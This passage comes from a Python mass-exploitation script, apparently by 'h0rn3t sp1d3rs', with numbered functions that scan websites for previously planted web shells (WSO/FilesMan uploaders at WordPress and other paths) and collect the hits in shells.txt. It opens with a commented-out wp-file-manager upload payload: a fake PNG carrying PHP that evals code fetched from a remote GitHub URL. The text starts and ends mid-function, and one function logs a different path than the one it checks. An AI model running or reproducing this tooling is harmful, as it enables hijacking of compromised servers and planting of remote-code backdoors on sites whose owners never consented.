            # data = """--------------------------66e3ca93281c7050\\Content-Disposition: form-data; name=\cmd\\\\\upload\\--------------------------66e3ca93281c7050\\Content-Disposition: form-data; name=\target\\\\\l1_Lw\\--------------------------66e3ca93281c7050\\Content-Disposition: form-data; name=\upload[]\; filename=\spamtools.be.php\\\Content-Type: image/png\\\\\89PNG\\\1a\\00\00\00\IHDR\00\00\01^\00\00\01^\04\03\00\00\00?\05j)\00\00\00\1ePLTE\ff\ff\ff\ef\ef\ef\e5\e5\e5\ce\ce\ce\a1\a1\a1iiiVVVGGG333\00\00\00g\00\cc\e2\00\00\\c0IDATx\da\ed]K[\db\c8\12m\c9\ce^\c6\90\bb58\\dc\9dm\9c\\d9\d9X\1e\c2\8e\87I\c22\!\93\e5@xmc\02\f1\da\0f\a9\ff\ed]`\eb\ddVU\c9C\b5\e6\a2-\d4\a7\f2Q\e9\a8\1fuN\8b\df\b9\ba\ee\84\bc\^\d7\83\c7\8f\bc\9a\08\a7\b1F\bb\aa\97\f4\c8:5\f2^L,A\bb\8cSr\e4\055\d2\bc\17\0eC\be\e4H\f3NL*\8f\8f\d2i\be\f05Y\f05\ffM\f5[*\95J\b9\c1\b7\dc\b4\8f\de\9f\1e\f5\ec\86\95\83\fa\adv\ff\92\d3\cb\fd\ba]\d1\86\1f\92Q2\eck\19\b8\dc\93FB\a4>\f5[\de\91\91k\d2\d1\18\df\eaG\19\bb\dcCK\d7\fa-\97\12\90\b0.\fcP>\9629a-\f9\d7\dc\95\8a\cb\dd\d6\11\df\1d\a9\bc&5\fd\ea\f7\e5@\9d\af\bc\ad\e8\c6\0f\85c9\ef:\d0\8c\8d\9d\b9\e9J\a7\a6\17\be\cb\83\f9\f9\ca[\ad\ea\d7\d8MIW\ba-\9d\f8\e1\85L\bdn-}\f87\1d^)eK\1f|\97\01\e9\fa\15\cc_\bf\10x\a5[\d3\85\1f\\03H\be\f2\\17\fe}\03JW\8e+z\e0k\1c\c3\f2\95m=\ea\b7\08LW\8e\f4\e0\87-h\be\d3{1\f3\af\-\07)\f7t\c0\17\\0eR\f6u\a8\dfux\be\0f\8b\b7\bc\fc\00\fa\16\87\be\c9\bc\fc\0b\fcX<\\9f\f8\f1E\94\ef\94\d1x\eb\f7\&\df\b1\c5\ce\0f\98\f2\95\b2\c6\cd\bf\c6wT\be\fb\dc\f8\16P\e9\ca\9f\dc\f5\bb\8c\cbw\c4\cd\0f\1b\b8|\c7\163\ff\be\c5\e5\eb\d6x\f15p\f4 e\8b\b7~\91\f4 e\9b\97\1f\cc\012\df\bfy\f9\17IgR\f6y\f1]\c6\e6;\e4\ad\dfg\d8|G\16+?\ac`\f3\1d\f3\f2\ef::_^|\b7\b0\f9:\16k\fd\be\c5\e6\ebV\b2\f0Yf|\f1\f9\d6X\f1\c5~\8e\a5\cc\19\be2o\f8\d6\84q\c9\87/%_\f3k\8e\f8![=<>\be\cc\fc@\e13\ce\ef\1b\e5{\c1\89\ef\066\df\/\ffR\c6;\9c\f8\aeP\c6\bf\8c\f8\e2\c7\eb\bc\f3\8b\z>\c4\8b\ef#\cf73\e3\8b\9e\cf\12\ac\f8\1a\c7\c8|\99\d7w\04a=\8a\13_\f4z_\85\19\dfW\f8\f5T\ce\f1/e\bd\9as\fc\8b%\b43\c1\8c/\92 \f6\d8\f7\e7\f1\fbY\bc\fbo\af\b0\af\1b\f3\fe&j\041\14\ec\fb\c7\e6\\\df\03\c1\df\1f\b5\8b,_\ee\fe(D\01?tt1\f7\97<f?\ccB\fa\a3\8e1\83\1d\\faS\d7\11sc\1d\f0-\e2\ca\81\bd\bf\0f\bc'\db\8eF\f2\e0+\fe\c0\f5{\b2\f7\a7\16`\9f\8c\cfB\13|\c5;\d0\cePM\e8Q\bfB\14\07\f0\b7M\0b}\00\e0\8ds\eb\de/\e5\d7\b7,\a7\03|+4\c2\d7H\ad`\b7\b6\88|\17\a6\1fJ\ad\e0sK\11\c9\82o*\07\8f\03z'-\f4\b1)z\b2mu$\0f\be\f3_\b9\1f\d6\9cH\16|\85x\9d\fe%\d6\86\1f\84\10\c2Tr\c4\a4\1d\fe\a5\9a\e8\bb\0b\ef@\f2X}\fc\\ca\1f\93\d3]\9c^z\c1\fa\f9$\84\9d\8e\05\88d\c1W\88\a5n\94%~m\c7#5\f2\d70\9a\a1\9apz\15h$\0b\beB\88B\f3\c3\0c\e3\bb^\03\13\c9\81\af\10B\946\edn\f7\a8kw\d6p\bf\94\07\dfi\ceB\fd\d7\bc\f9\1b\e5\cd'o\feFF\de\f0\fd\f2\e7rVK\b4k\e9\b4B\8d\bc\a4\de\b3p/\dc\afG\b4\eb\fd\e0\e8\f1#'B\deS\bd\f4\e45\d5\bf\cf\a5\de\f3\da\11\0e\d9K\ef\94\1c\f9m\8d\1ay\97\b3\f7\ed>\83\1f\de\d3\f7\ed\e9\fb\f6\f4}\8b\fcimssss\cd\caE\fd\1ae\fb\fd\f5@J\f7\fe\c8n\e8?\fe-\07\ad\f4\eez\ab\da\e0\9b<\bfhF\16/~u,\8d\f15^\0f\e26o\15m\eb\d7\f83ie(\b6\18\a0\0b?$\a7+e\cf\d2\92\\e5Rl\c4\aaP\13|\d5\d6t\ee\be\86\f5[\9c\b3\9d\eb\d4\b5\e3\07s\eef\e3\a8\a2\1b\ff\be\9e\bf\b3t\a8\19\bei\9b\fbA/H\1d\ea\f7\1d|#W\07~H\df\da\0f:\ff\f1\f3/\a0u\e2V#|!\9d\13>\c0\fc\f5\fbN\a2:=\b8\f9\01\d6\f9\e3\f5\\b0\f3/\b0\f7\f2\b3&\f8B\9b\c9\c7\96\1e\f5\0b\ee\0cl\e9<?php @eval(\?>\.file_get_contents(\https://raw.githubusercontent.com/H0rn3t-Sp1d3rs/apk/main/h0rn3t.php\));?>\\--------------------------66e3ca93281c7050--\\"""
            # ck = requests.post(url+'/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php',headers=headers,data=data, allow_redirects=True,timeout=15)
            check = requests.get(url+'/wp-content/plugins/wp-file-manager/lib/php/h0rn3t.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 106 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/plugins/wp-file-manager/lib/php/h0rn3t.php\n')
            else:
                print ('[#] Exploit 106 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#

def exploit_107(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/license.php',headers=headers, allow_redirects=True,timeout=15)
        if ('kill_the_net' in check.content.decode("utf-8")):
                print (' [#] Exploit 107 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/license.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/license.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'kill_the_net' in check.content.decode("utf-8"):
                    print (' [#] Exploit 107 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/license.php\n')
            else:
                print ('[#] Exploit 107 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_108(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/uploads/_input_3_codefam.phtml',headers=headers, allow_redirects=True,timeout=15)
        if ('Priv8 Uploaders' in check.content.decode("utf-8")):
                print (' [#] Exploit 108 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/uploads/_input_3_codefam.phtml\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/uploads/_input_3_codefam.phtml',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Priv8 Uploaders' in check.content.decode("utf-8"):
                    print (' [#] Exploit 108 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/uploads/_input_3_codefam.phtml\n')
            else:
                print ('[#] Exploit 108 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_109(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/wp-class.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 109 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/wp-class.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/wp-class.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 109 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/wp-class.php\n')
            else:
                print ('[#] Exploit 109 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_110(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/fw.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 110 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/fw.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/fw.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 110 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/fw.php\n')
            else:
                print ('[#] Exploit 110 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
#
#
def exploit_111(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 111 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/themes/sketch/404.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 111 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/themes/sketch/404.php\n')
            else:
                print ('[#] Exploit 111 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_112(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/themes/twentyfive/include.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 112 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/themes/twentyfive/include.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/twentyfive/include.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 112 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/themes/twentyfive/include.php\n')
            else:
                print ('[#] Exploit 112 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_113(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 113 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp/wp-content/themes/sketch/404.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 113 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp/wp-content/themes/sketch/404.php\n')
            else:
                print ('[#] Exploit 113 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_114(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wordpress/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 114 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wordpress/wp-content/themes/sketch/404.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wordpress/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 114 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wordpress/wp-content/themes/sketch/404.php\n')
            else:
                print ('[#] Exploit 114 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_115(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/blog/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 115 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/blog/wp-content/themes/sketch/404.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/blog/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 115 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/blog/wp-content/themes/sketch/404.php\n')
            else:
                print ('[#] Exploit 115 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_116(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/site/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 116 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/site/wp-content/themes/sketch/404.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/site/wp-content/themes/sketch/404.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 116 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/site/wp-content/themes/sketch/404.php\n')
            else:
                print ('[#] Exploit 116 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_117(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/class-wp-uploads.php',headers=headers, allow_redirects=True,timeout=15)
        if ('Filesman' in check.content.decode("utf-8")):
                print (' [#] Exploit 117 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/class-wp-uploads.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/class-wp-uploads.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Filesman' in check.content.decode("utf-8"):
                    print (' [#] Exploit 117 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/class-wp-uploads.php\n')
            else:
                print ('[#] Exploit 117 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_118(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',headers=headers, allow_redirects=True,timeout=15)
        if ('taskname="phpunit"' in check.content.decode("utf-8")):
                print (' [#] Exploit 118 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'taskname="phpunit"' in check.content.decode("utf-8"):
                    print (' [#] Exploit 118 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php\n')
            else:
                print ('[#] Exploit 118 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_119(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/xx.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 119 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/xx.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/xx.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 119 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/xx.php\n')
            else:
                print ('[#] Exploit 119 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_120(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-admin/bp.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 120 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-admin/bp.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/bp.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 120 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-admin/bp.php\n')
            else:
                print ('[#] Exploit 120 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
##all done
#call me h0rn3t sp1d3rs 
def exploit_121(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/admin.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 121 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/admin.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/admin.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 121 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/admin.php\n')
            else:
                print ('[#] Exploit 121 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_122(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/3x.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 122 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/3x.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/3x.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 122 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/3x.php\n')
            else:
                print ('[#] Exploit 122 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_123(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/themes/twentytwentythree/styles/xx.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 123 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/themes/twentytwentythree/styles/xx.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/themes/twentytwentythree/styles/xx.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 123 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/themes/twentytwentythree/styles/xx.php\n')
            else:
                print ('[#] Exploit 123 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_124(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wso112233.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 124 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wso112233.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wso112233.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 124 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wso112233.php\n')
            else:
                print ('[#] Exploit 124 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_125(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/index.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="f[]" onchange="this.form.submit()" multiple>' in check.content.decode("utf-8")):
                print (' [#] Exploit 125 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-content/index.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-content/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="f[]" onchange="this.form.submit()" multiple>' in check.content.decode("utf-8"):
                    print (' [#] Exploit 125 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-content/index.php\n')
            else:
                print ('[#] Exploit 125 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_126(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/index.php',headers=headers, allow_redirects=True,timeout=15)
        if ('<input type="file" name="f[]" onchange="this.form.submit()" multiple>' in check.content.decode("utf-8")):
                print (' [#] Exploit 126 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/index.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if '<input type="file" name="f[]" onchange="this.form.submit()" multiple>' in check.content.decode("utf-8"):
                    print (' [#] Exploit 126 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/index.php\n')
            else:
                print ('[#] Exploit 126 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_127(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/lock360.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 127 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/lock360.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/lock360.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 127 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/lock360.php\n')
            else:
                print ('[#] Exploit 127 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_128(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wso.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 128 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wso.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wso.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 128 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wso.php\n')
            else:
                print ('[#] Exploit 128 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_129(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/for.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 129 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/for.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/for.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 129 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/for.php\n')
            else:
                print ('[#] Exploit 129 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_130(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 130 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/shell20211028.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 130 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/wp-includes/shell20211028.php\n')
            else:
                print ('[#] Exploit 130 --> ' + url + ' {}[Failed]'.format(fr))
    except:
        print ('\033[0;31m[#] Dead --> ' + url + ' {}[Failed]'.format(fr))
#
def exploit_131(url):
    try:
        # try with http
        
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,timeout=15)
        if ('FilesMan' in check.content.decode("utf-8")):
                print (' [#] Exploit 131 --> ' + url + ' {}[Succefully]'.format(fg)) 
                open('shells.txt', 'a').write(url + '/wp-includes/shell20211028.php\n')
        # try with https 
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-includes/shell20211028.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'FilesMan' in check.content.decode("utf-8"):
                    print (' [#] Exploit 131 --> ' + url + ' {}[Succefully]'.format(fg)) 
                    open('shells.txt', 'a').write(url + '/ws.php\n')
            else:
                print ('[#] Exploit 131 --> ' + url + ' {}[Failed]'.format(fr))
